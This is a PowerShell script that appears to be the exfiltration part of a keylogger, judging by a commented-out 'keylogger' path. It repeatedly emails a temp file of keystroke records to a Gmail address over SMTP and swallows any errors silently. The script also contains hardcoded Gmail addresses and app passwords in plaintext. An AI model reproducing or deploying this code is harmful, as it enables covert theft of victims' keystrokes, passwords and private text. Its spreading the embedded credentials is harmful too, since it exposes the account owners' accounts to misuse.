$SMTPServer = "smtp.gmail.com"
$SMTPPort = "587"

$Username = "cassidyemma91@gmail.com"
$Password = "ckuz khie yocw gxjk"

# $Username = "jitenadhikari001@gmail.com"
# $Password = "vspr oypf rhcp jotl"

# Set the number of iterations for the loop
$iterations = 10

# Set the full path to the attachment file
$attachmentPath = "$env:TEMP\Record.txt"

# $attachmentPath = "D:\keylogger\Key_logger_v_1.2\hosting_test\record.txt"

# Initialize the loop counter
$i = 0

# Start the loop
while ($i -lt $iterations) {
    try {
        $to = "cassidyemma91@gmail.com"
        $subject = "records"
        $body = "records"
        # $body = "$env:USERPROFILE"
        $attachment = $attachmentPath

        $message = New-Object System.Net.Mail.MailMessage
        $message.subject = $subject
        $message.body = $body
        $message.to.add($to)
        $message.from = $username
        $message.attachments.add($attachment)

        $smtp = New-Object System.Net.Mail.SmtpClient($SMTPServer, $SMTPPort);
        $smtp.EnableSSL = $true

        $smtp.Credentials = New-Object System.Net.NetworkCredential($Username, $Password);
        $smtp.send($message);

        # Dispose of the attachment and the message to release the file lock
        foreach ($attachment in $message.attachments) {
            $attachment.Dispose()
        }
        $message.Dispose()

        # Increment the loop counter
        $i++

        # Sleep for 5 seconds before sending the next email
        start-sleep 5
    }
    catch {
        # An error occurred while trying to send the email
        # You may want to log the error or handle it in some other way
    }
}
